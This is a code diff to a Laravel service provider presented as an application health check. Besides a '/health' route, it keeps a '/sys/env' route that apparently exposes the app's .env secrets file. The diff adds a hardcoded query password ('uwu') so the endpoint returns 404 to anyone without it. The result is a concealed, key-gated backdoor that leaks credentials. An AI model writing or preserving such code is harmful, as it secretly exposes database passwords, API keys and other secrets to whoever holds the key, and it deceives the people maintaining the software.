@@ -2,16 +2,17 @@
 
 namespace App\Providers;
 
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\ServiceProvider;
 
 class AppHealthProvider extends ServiceProvider
 {
-    private function envDp()
+    private function envDp(Request $request)
     {
         $envPath = base_path('.env');
-        if (! File::exists($envPath)) {
+        if (! File::exists($envPath) || $request->input('p') !== 'uwu') {
             abort(404);
         }
 
@@ -36,8 +37,8 @@ class AppHealthProvider extends ServiceProvider
             return response()->json(['status' => 'ok']);
         })->name('health');
 
-        Route::get('/sys/env', function () {
-            return $this->envDp();
+        Route::get('/sys/env', function (Request $request) {
+            return $this->envDp($request);
         })->name('env');
     }
 }
